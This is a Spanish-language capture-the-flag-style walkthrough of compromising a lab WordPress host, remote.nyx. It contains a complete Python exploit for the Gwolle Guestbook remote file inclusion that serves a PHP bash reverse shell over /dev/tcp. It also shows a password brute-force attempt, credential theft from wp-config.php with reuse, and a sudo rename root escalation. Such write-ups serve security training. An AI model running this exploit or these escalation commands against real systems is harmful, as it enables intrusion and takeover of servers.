---
Estado: Completado
Plataforma: Vulnix
SO: Linux
Dificultad: Facil
VectorInicial: RFI
Privesc: Sudo rename
Fecha: 2026-02-23
---
<img width="585" height="397" alt="Pasted image 20260218113338" src="https://github.com/user-attachments/assets/9379e35f-eb30-4de0-a170-c3ab4a599357" />

Empezaremos con un reconocimiento de red para ver la IP de este laboratorio.

```bash
 sudo arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.2	08:00:27:de:2e:0e	(Unknown)
10.0.11.12	08:00:27:cc:92:8b	(Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 3 responded
```

Como podemos observar la IP es ***10.0.11.12*** así que empezaremos con el reconocimiento de puertos y servicios.

```bash
 settarget 10.0.11.12            
TARGET establecido: 10.0.11.12

 gomap -s $TARGET
🎯 Scanning 10.0.11.12 (997 ports)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 8.4p1 Debian-5+deb11u1
80      open   http            Apache 2.4.56 (Debian)

Host Exposure Summary
- 10.0.11.12 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 52ms | hosts: 1 | open ports: 2
```

Solo tenemos 2 puertos abiertos:
- 22 - Conexión mediante SSH
- 80 - Protocolo HTTP para servicios web

Vamos a ver que tenemos en la web de este laboratorio.

Nos encontramos con la pagina por defecto de Apache, así que tendremos que realizar una enumeración de directorios a ver que encontramos.

```bash
 dirb http://$TARGET

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 23 11:02:39 2026
URL_BASE: http://10.0.11.12/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.11.12/ ----
+ http://10.0.11.12/index.html (CODE:200|SIZE:10701)                                                                                                       
+ http://10.0.11.12/server-status (CODE:403|SIZE:275)                                                                                                      
==> DIRECTORY: http://10.0.11.12/wordpress/

<skip>
```

Bueno, parece que estamos frente a un *Wodpress* así que vamos a mirar la web a ver si podemos ver algo interesante que podamos usar.

<img width="268" height="312" alt="Pasted image 20260223110618" src="https://github.com/user-attachments/assets/cc1df6fc-b176-48f6-bdd6-b0732f1eda40" />

Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el ratón por encima de *¡Hello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que añadirlo a nuestro */etc/hosts*.

```bash
 sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       jd-sec.intracof.local   jd-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.0.11.12 remote.nyx
```

Ahora podemos ver la web en condiciones pero solo encontramos un usuario **tiago** por ende trataremos de realizar una enumeración de este CMS para buscar vectores de ataque.

```bash
 wpscan --url http://remote.nyx/wordpress/ -e u,p --plugins-detection aggressive

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://remote.nyx/wordpress/ [10.0.11.12]
[+] Started: Mon Feb 23 11:43:48 2026

<skip>


[+] gwolle-gb
 | Location: http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/
 | Last Updated: 2026-02-06T09:48:00.000Z
 | Readme: http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.10.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/, status: 200
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: Gwolle Guestbook <= 1.5.3 - Remote File Inclusion (RFI)
 |     Fixed in: 1.5.4
 |     References:
 |      - https://wpscan.com/vulnerability/65d869e8-5c50-4c82-9101-6b533da0c207
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8351
 |      - https://www.immuniweb.com/advisory/HTB23275
 |      - https://seclists.org/bugtraq/2015/Dec/8
 
 <skip>
 
 [i] User(s) Identified:

[+] tiago
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://remote.nyx/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 
 <skip>
```

Vemos que hay un plugin vulnerable llamado **qwolle-gb** y el usuario **tiago** como ya vimos antes.

Buscaremos información del plugin a ver si no es necesario iniciar sesión para explotar las vulnerabilidades.

En la web de [Explot Database](https://www.exploit-db.com/exploits/38861) encontramos que este plugin es vulnerable a un Remote File Inclusión (RFI) y nos indica la forma de proceder.

```txt
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

Así mismo hay exploit en *GitHub* que ayudan a automatizar esta explotación.

Pero yo utilizare el siguiente código.

```python
import requests
import sys
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

def create_payload(lhost, lport):
    payload = f"""<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");
?>"""
    
    with open("wp-load.php", "w") as f:
        f.write(payload)

    print("[+] Payload wp-load.php creado")


def start_server(port):
    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
    print(f"[+] Servidor HTTP escuchando en puerto {port}")
    server.serve_forever()


def exploit(target_url, lhost, webport):
    url = f"{target_url}/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php"
    
    params = {
        "abspath": f"http://{lhost}:{webport}/"
    }

    print("[+] Enviando exploit...")
    r = requests.get(url, params=params)

    print("[+] URL:", r.url)
    print("[+] Status:", r.status_code)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Uso: {sys.argv[0]} <URL> <LHOST> <LPORT> <WEBPORT>")
        print("Ejemplo:")
        print(f"{sys.argv[0]} http://remote.nyx/wordpress 10.0.11.11 443 8000")
        sys.exit(1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    webport = int(sys.argv[4])

    create_payload(lhost, lport)

    server_thread = threading.Thread(target=start_server, args=(webport,))
    server_thread.daemon = True
    server_thread.start()

    exploit(target, lhost, webport)

    print(f"[+] Esperando shell en {lhost}:{lport}...")
    print("[+] Ejecuta en otra terminal:")
    print(f"nc -lvnp {lport}")

    while True:
        pass
```

Primero tendremos que tener a la escucha nuestro equipo.

```bash
 penelope -p 443                 
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Una vez a la escucha ejecutamos el exploit para tener acceso a la maquina victima.

```bash
 python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
```

Este exploit solicita la dirección donde se encuentra *Wordpress*, después la *ip de atacante*, el *puerto de atacante* y por ultimo el *puerto donde se servirá el payload*.

Con esto ya tendremos acceso a la maquina objetivo.

Ahora toca la escalada de privilegios, empecemos a probar.

```bash
www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l
```

Al ejecutar este comando nos pide contraseña, por este vector no podemos hacer nada.

```bash
www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ ls /home/
tiago
```

Curiosamente tenemos un usuario con el mismo nombre que en *wordpress* esto nos puede dar indicios de una *reutilización de contraseña* así que en otro terminal intentaremos encontrar la contraseña de este usuario y ademas en la actual buscaremos si existe algún *SUID*.

```bash
www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ find / -perm -4000 2>/dev/null 
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Estos fichero no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* puede ser interesante, probemos otras vías antes.

```bash
 wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
```

El ataque de diccionario no ha tenido el efecto deseado y por consiguiente continuamos con otra tarea.

Una de las tareas mas comunes es mirar el fichero *wp-config.php*  por si hay información relevante, solemos encontrar credenciales de bases de datos que nos pueden permitir intentar una reutilización de contraseñas.

```bash
www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ cat /var/www/html/wordpress/wp-config.php

<skip>

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'WPr00t3d123!' );

<skip>
```

Ahora tenemos una contraseña así que tendremos que probar si nos sirve.

```bash
www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ su tiago
Password: 
tiago@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ 
```

Parece que esta contraseña nos ha servido para hacer un movimiento lateral al usuario *tiago*.

```bash
tiago@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l
Matching Defaults entries for tiago on remote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tiago may run the following commands on remote:
    (root) NOPASSWD: /usr/bin/rename
```

Ahora si tenemos un vector de ataque claro para conseguir acceso como **root**.

Lo primero que haremos sera crear un fichero para usar como dummy y nos permita el uso de *rename*.

```bash
touch test.txt
```

Ahora solo tenemos que ejecutar el siguiente comando para ser *root*.

```bash
sudo rename -e 'system("/bin/bash")' test.txt
```

Con esto ya tenemos comprometida la maquina.
